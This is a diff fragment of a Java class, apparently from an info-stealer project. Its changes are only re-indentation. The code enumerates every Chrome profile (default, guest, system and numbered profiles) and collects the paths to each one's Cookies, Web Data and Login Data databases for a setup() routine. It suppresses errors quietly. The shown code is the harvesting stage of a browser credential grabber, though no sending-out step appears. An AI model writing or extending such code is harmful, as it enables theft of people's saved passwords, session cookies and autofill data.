@@ -29,7 +29,7 @@ public class chrome extends utilities {
 		systemWebData = System.getenv("localappdata") + "/Google/Chrome/User Data/System Profile/Web Data",
 		systemLoginData = System.getenv("localappdata") + "/Google/Chrome/User Data/System Profile/Login Data";
 	
-	public void initialize() throws Exception {
+    public void initialize() throws Exception {
         setup("browser/chrome/default/", defaultCookie, defaultWebData, defaultLoginData);
         setup("browser/chrome/guest/", guestCookie, guestWebData, guestLoginData);
         setup("browser/chrome/system/", systemCookie, systemWebData, systemLoginData);
@@ -37,8 +37,8 @@ public class chrome extends utilities {
         Arrays.stream(new File(System.getenv("localappdata") + "/Google/Chrome/User Data").listFiles(File::isDirectory))
 	        .filter(x -> x.getName().startsWith("Profile ")).forEach(file -> {
 	            try {
-					setup(String.format("browser/chrome/%s/", file.getName().replace(" ", "_").toLowerCase()), System.getenv("localappdata") + String.format("/Google/Chrome/User Data/%s/Network/Cookies", file.getName()), System.getenv("localappdata") + String.format("/Google/Chrome/User Data/%s/Web Data", file.getName()), System.getenv("localappdata") + String.format("/Google/Chrome/User Data/%s/Login Data", file.getName()));
-				} catch (Exception ignore) {}
+			setup(String.format("browser/chrome/%s/", file.getName().replace(" ", "_").toLowerCase()), System.getenv("localappdata") + String.format("/Google/Chrome/User Data/%s/Network/Cookies", file.getName()), System.getenv("localappdata") + String.format("/Google/Chrome/User Data/%s/Web Data", file.getName()), System.getenv("localappdata") + String.format("/Google/Chrome/User Data/%s/Login Data", file.getName()));
+		    } catch (Exception ignore) {}
 	        }
 	    );
     }
